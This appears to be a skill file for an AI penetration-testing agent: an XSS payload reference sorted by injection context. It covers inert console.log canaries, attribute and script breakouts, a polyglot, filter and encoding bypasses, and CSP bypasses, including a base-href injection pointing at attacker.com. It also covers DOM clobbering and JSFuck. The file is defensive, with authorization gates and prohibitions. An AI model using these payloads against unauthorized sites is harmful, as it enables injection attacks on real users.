---
name: payload-reference-xss
description: Cross-Site Scripting reference framework — defensive taxonomy organized by injection context (HTML body, attribute, JavaScript string, event handler, href/src, style, DOM sink), content-type and encoding boundaries, safe canary strategy via inert alert/document markers, CSP bypass awareness, and mutation XSS (mXSS) reference with strict no-data-exfiltration and no-weaponization boundaries.
disable-model-invocation: true
risk: passive
allowed-modes: [auto, bug-bounty, red-team, ctf, blue-team, offensive, grey-hat, forensic, reverse-engineering, mobile-pentest]
authorization-required: conditional
evidence-outputs: [reference-notes, validation-plan, safe-canary-log, redaction-decision]
---

# Payload Reference XSS

Use this skill as a defensive reference framework for Cross-Site Scripting assessment. Organize payload knowledge by injection context (HTML body, tag attribute, JavaScript string, event handler, href/src attribute, style context, DOM sink), content-type boundaries (HTML, XHTML, XML, SVG), encoding requirements, and CSP bypass awareness. Every payload discussion maps to a safe canary strategy — confirming script execution with an inert marker (`alert(document.domain)` or `console.log('XSS')`) without exfiltrating data, stealing cookies, defacing, or chaining to further attacks. This skill is a reference and triage aid. It never provides weaponization or data-exfiltration runbooks. All active validation routes through `pentest_agent_execute_tool` with authorization, scope, and approval gates.

## Required inputs

- Injection context: where user input is rendered in the DOM (HTML body text, HTML tag attribute value — single-quoted, double-quoted, unquoted, JavaScript string inside `<script>`, inline event handler `onclick="..."`, `href`/`src` attribute, style attribute, `<style>` tag, or DOM-based sink like `innerHTML`, `document.write`, `eval`, `location`).
- Relevant encoding: HTML entity encoding, URL encoding, JavaScript escaping (backslash-escape), CSS escaping, or multiple layers of encoding.
- Any observed WAF/XSS filter behavior, CSP headers (`Content-Security-Policy`), or sanitizer (DOMPurify, OWASP Java HTML Sanitizer, Bleach, server-side regex).
- Target and scope file when any live system is mentioned.
- Authorization cache before target contact.
- Desired output: validation plan, safe canary design, triage decision, or redaction guidance.

## Required gates

1. `pentest_agent_load_config` → `pentest_agent_validate_policy`.
2. `pentest_agent_parse_scope` when target context exists.
3. `pentest_agent_validate_target` before any live URL, host, API, or account is contacted.
4. `pentest_agent_check_authorization` before active validation.
5. `pentest_agent_build_command` → `pentest_agent_execute_tool` for all active checks.
6. `pentest_agent_append_evidence` for redacted notes.

## Defensive payload taxonomy

### Category 1 — context-specific safe canaries

Goal: confirm script execution in the specific injection context using the simplest inert marker.

**HTML body context** (input inserted between tags):
- Safe canary: `<script>console.log(document.domain)</script>` — logs the domain to console. Inert: no data exfiltration, no alert dialog that could alarm other users on shared test accounts.
- Alternative safe canary: `<img src=x onerror=console.log(document.domain)>` — uses an image load error to trigger JavaScript. Useful when `<script>` tags are filtered.
- Blocked: `<script>alert(1)</script>` triggers a visible dialog — avoid on production or shared targets.

**HTML attribute context — double-quoted** (`<div data-user="INPUT">`):
- Escape the attribute: `"><script>console.log(document.domain)</script>` — closes the attribute and the tag, then injects script.
- Without breaking the tag: `" autofocus onfocus=console.log(document.domain) x="` — adds an `autofocus` attribute that triggers `onfocus` when the element renders.
- Alternative: `" onmouseover=console.log(document.domain) x="` — requires mouse interaction; lower severity.

**HTML attribute context — single-quoted** (`<div data-user='INPUT'>`):
- Escape: `'><script>console.log(document.domain)</script>`.
- Without breaking: `' autofocus onfocus=console.log(document.domain) x='`.

**HTML attribute context — unquoted** (`<div data-user=INPUT>`):
- Escape: `><script>console.log(document.domain)</script>`.
- Without breaking: ` autofocus onfocus=console.log(document.domain)`.

**JavaScript string context** (`<script>var name = 'INPUT';</script>`):
- Safe canary: `'; console.log(document.domain); //` — closes the string, adds a safe log statement, comments out the rest.
- Safe canary (if quotes are escaped): `</script><script>console.log(document.domain)</script>` — closes the script tag and opens a new one. Works when backslash-escaping or double-quoting prevents string escape.
- Safe canary (inside JSON.parse or inline JSON): escape the JSON value and inject into the surrounding JavaScript context as above.

**Inline event handler context** (`<a href="#" onclick="doSomething('INPUT')">`):
- Safe canary (HTML-encoded input): `'); console.log(document.domain); //` — closes the function call and the event handler attribute.
- Safe canary (double-HTML-encoded): `&apos;); console.log(document.domain); //` — if the input is HTML-encoded but the event handler attribute is not decoded before execution, this bypasses.

**href attribute context** (`<a href="INPUT">`):
- Safe canary: `javascript:console.log(document.domain)` — the `javascript:` pseudo-protocol executes when the link is clicked. Requires user interaction; confirm with `target=_blank` or user-click simulation.
- Alternative: `data:text/html,<script>console.log(document.domain)</script>` — data URI with embedded HTML; may be blocked by CSP.

**Style context** (`<style>body { background: url('INPUT'); }</style>` or `<div style="background: url('INPUT')">`):
- XSS in style context is rare in modern browsers but was historically exploitable via CSS expression (IE), `-moz-binding` (Firefox), or `@import`. Reference: style-context injection is typically limited to CSS injection (data exfiltration via CSS attribute selectors), not full XSS. Document as CSS injection, not XSS.

**DOM-based sinks** (client-side JavaScript reads from `location.hash`, `document.referrer`, `postMessage`, or `localStorage` and writes to `innerHTML`, `document.write`, `eval`, `setTimeout`, `setInterval`, `Function` constructor):
- Safe canary: inject into the source (`location.hash`, URL parameter) a payload that, when processed by the vulnerable client-side code, executes `console.log(document.domain)`. DOM XSS requires understanding the client-side code flow — use sources and sinks from the DOM XSS cheat sheet, not generic payloads.

### Category 2 — encoding and filter bypass awareness (reference)

Goal: understand how encoding contexts interact with filters for defense assessment.

**HTML entity encoding bypass in event handlers**: HTML entity encoding in event handler attributes (`onclick="&apos;console.log(1)&apos;"`) is decoded by the browser before JavaScript execution. If a filter HTML-encodes single quotes (`'` to `&#39;`) but the value is placed in an event handler, the browser decodes the entity before executing — the filter's encoding is bypassed.

**JavaScript string encoding**: inside a JavaScript string, backslash escaping (`\'`, `\"`, `\\`, `\n`) is applied. If a filter only escapes HTML entities but not JavaScript backslashes, the JavaScript string context is vulnerable. Example: input `'` becomes `&#39;` (HTML entity) but inside a JS string `<script>var x = '&#39;';</script>`, the `&#39;` is NOT decoded to `'` by JavaScript — this is actually safe. Conversely, input `\'; alert(1); //` may break the string if backslashes are not escaped.

**Multiple encoding layers**: when input passes through multiple decoders (server-side HTML decode → JavaScript eval → DOM write), encoding must match each layer. Example: the server HTML-encodes input, the result is placed in a hidden input, JavaScript reads the hidden input value and writes it via `innerHTML`. The `innerHTML` call HTML-decodes the value — double encoding (`&amp;lt;script&amp;gt;`) may be needed to survive the first decode and trigger the second.

**Polyglot canaries**: payloads that work in multiple contexts simultaneously. Example: `javascript:console.log(document.domain)/* --></script><svg/onload=console.log(document.domain)>` — works as `href`, breaks out of `<!--` comments, closes `</script>`, and triggers SVG onload. Reference for defense filter design; do not use polyglots in active validation as they combine multiple vulnerabilities.

### Category 3 — CSP bypass awareness (reference only)

Goal: understand Content Security Policy bypass vectors for defense assessment and policy hardening.

**CSP bypass via JSONP endpoints**: if the target domain hosts a JSONP endpoint (`callback` parameter that returns user-controlled function name), and the CSP includes `script-src 'self'`, the JSONP endpoint on the same origin can be used as a script gadget. Example: `<script src="/api/jsonp?callback=console.log(document.domain)">`.

**CSP bypass via script gadgets**: modern CSP bypasses rely on finding existing JavaScript on the allowed origins that performs dangerous DOM operations with attacker-controllable input (script gadgets). This is framework-specific (AngularJS sandbox escapes, validation bypass in Angular expressions) and requires deep framework knowledge.

**CSP bypass via `base-uri` misconfiguration**: if `base-uri` is not restricted, injecting `<base href="https://attacker.com/">` changes the base URL for relative script loads. If the page loads scripts with relative paths and CSP allows the attacker's domain, script injection is achieved.

**CSP bypass via `strict-dynamic`**: if CSP uses `strict-dynamic`, script loading via `createElement('script')` is allowed from any source, but only if the creating script is itself trusted. This weakens host-based allowlists but strengthens nonce/hash-based policies.

CSP bypass is advanced and target-specific. Reference for policy review; do not attempt CSP bypass in active validation without explicit authorization for CSP analysis.

### Category 4 — mutation XSS (mXSS) awareness (reference)

Goal: understand DOM-clobbering and parser-mutation vectors for defense.

**mXSS concept**: the browser's HTML parser and the DOM serializer (`innerHTML` read/write) may parse differently, causing a sanitized string to become unsanitized after serialization and re-parsing. Example: a payload that uses `form` or `table`-scope elements with specific nesting patterns that the parser re-interprets when written to `innerHTML`. This is an advanced vector that bypasses client-side sanitizers including DOMPurify (in specific versions and configurations).

**DOM clobbering**: injecting HTML elements with `id` or `name` attributes that shadow global JavaScript variables. Example: `<form id="config"><input name="apiKey" value="attacker-controlled"></form>` clobbers `window.config.apiKey` if the JavaScript references `config.apiKey` without type-checking.

Reference for defense and sanitizer configuration. mXSS payloads are highly specific to the sanitizer version and browser; do not attempt without explicit authorization and a controlled test environment.

### Category 5 — XSS without parentheses or letters (reference)

Goal: understand extreme filter bypass for defense assessment.

**No-parentheses XSS**: `onerror=eval` with `throw` to pass arguments. `throw` is a statement that doesn't require parentheses. Example: `<script>throw onerror=eval, 'alert\x281\x29'</script>`.

**No-letters XSS (JSFuck)**: encodes JavaScript using only `[]()!+{}` characters. Example: `([]+[])[+!+[]]` constructs the letter `a`. Used to bypass keyword filters. Reference for defense: any filter that allows arbitrary `[]()!+{}` characters may still permit code execution.

Reference only for defense and filter design validation. Do not deploy non-alphanumeric payloads in active validation — they demonstrate filter bypass capability, not vulnerability.

## Decision points

- **Safe canary executes → confirm XSS**: record the injection context and canary used. Do not escalate to cookie exfiltration, keylogging, DOM manipulation, or data theft.
- **Safe canary blocked by filter → try context-appropriate alternate**: if `<script>` is blocked, try event handler. If `onerror` is blocked, try `onfocus`+`autofocus`. If all event handlers blocked, try SVG vector `<svg onload=...>`. Stop if 3-4 alternate canaries fail.
- **CSP blocks all script execution → document CSP as mitigating control**: the finding is "reflected/stored input without sanitization, mitigated by CSP." This is a lower-severity finding but still reportable as defense-in-depth.
- **DOM-based XSS requires code-flow analysis → document sink, source, and code path**: do not attempt to craft payloads without understanding the specific sink. Generic DOM XSS payloads are often ineffective.
- **XSS confirmed on production target → use console.log, NOT alert()**: alert dialogs block the user interface and may alarm legitimate users monitoring the system. `console.log` is silent and equally valid as proof.

## Prohibited behavior

- Exfiltrating cookies (`document.cookie`), session data, tokens, or any sensitive client-side storage.
- Redirecting users (`location=`, `window.location`, `document.location`).
- Modifying the DOM to deface, phish, or impersonate (`innerHTML`, `outerHTML` injection with attacker-controlled content).
- Loading external resources (`new Image().src`, `fetch`, `XMLHttpRequest`, `import()`).
- Keylogging, form hijacking, or event listener injection.
- Accessing `window.localStorage`, `window.sessionStorage`, or IndexedDB.
- Using `postMessage` to send data cross-origin.
- Exploiting the XSS to chain with other vulnerabilities (CSRF via XSS, session riding).
- Auto-executing XSS on stored vectors without scoped test data — stored XSS affects every user who views the page; limit testing to your own test account's view.
- Providing weaponized XSS payloads (BeEF hooks, keyloggers, phishing overlays).

## Stop conditions

- Safe canary executes — stop at confirmation, do not escalate to data access.
- CSP allows script execution but blocks data exfiltration → document correctly-configured CSP as a mitigation.
- Stored XSS vector affects other users → stop, remove the stored payload immediately, document as critical.
- Input appears in multiple contexts (reflected in HTML body AND attribute AND JavaScript) → test each context separately, do not chain.
- mXSS or DOM clobbering vector appears applicable → document for specialist review, do not test without sanitizer-specific expertise.

## Evidence

Record: affected parameter and injection context (body, attribute, JS string, event handler, DOM sink), safe canary used, canary result (console log observed, dialog triggered if no alternative, no execution), CSP headers observed, WAF/filter behavior, and any context-specific encoding notes.

Never store: `document.cookie` output, session token values, full DOM snapshots with user data, or event logs containing other users' interactions.

## Report handoff

1. When an XSS surface is confirmed, hand off to `vuln-xss` for active validation with `pentest_agent_execute_tool`.
2. Reference this payload taxonomy in the finding as the detection rationale — link the safe canary used, the injection context, and any CSP/WAF observations.
3. If context-specific encoding or filter bypass techniques were identified, include them in the handoff notes to guide the active validator.
4. Recommend: context-aware output encoding (HTML entity, JavaScript, URL, CSS), Content-Security-Policy with strict `script-src`, `HttpOnly` + `Secure` cookie flags, and DOM-based XSS prevention via safe DOM APIs (`textContent`, `createElement` + `setAttribute`).
